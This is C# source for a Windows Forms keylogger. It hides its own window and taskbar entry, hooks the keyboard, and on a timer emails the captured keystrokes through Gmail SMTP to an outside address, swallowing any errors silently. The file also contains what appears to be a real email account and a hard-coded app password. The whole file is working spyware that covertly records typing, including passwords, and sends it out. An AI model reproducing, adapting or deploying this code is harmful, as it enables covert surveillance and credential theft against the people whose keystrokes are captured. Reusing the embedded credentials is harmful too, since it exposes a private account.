using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        private KeyboardHook keylogger = new KeyboardHook();
        public Form1()
        {
            InitializeComponent();
            this.Hide();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }
        private void SendLogByEmail()
        {
            string logData = KeyboardHook.GetLogAndClear();

        
            if (string.IsNullOrEmpty(logData))
            {
                return;
            }

            try
            {
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress("aliturk02006@gmail.com"); 
                mail.To.Add("240542016@firat.edu.tr\r\n");    
                mail.Subject = "KL Log - " + DateTime.Now.ToString("HH:mm");
                mail.Body = logData;

                SmtpClient client = new SmtpClient("smtp.gmail.com"); 
                client.Port = 587;
                client.EnableSsl = true;
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.UseDefaultCredentials = false;

          
                client.Credentials = new System.Net.NetworkCredential("aliturk02006@gmail.com", "sbsr egmh llro bdxh");

                client.Send(mail);
            }
            catch (Exception)
            {
                
            }
        }


        private void Form1_Load(object sender, EventArgs e)
        {

            keylogger.StartHook();
            timer1.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            keylogger.StopHook();

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendLogByEmail();
        }
    }
}
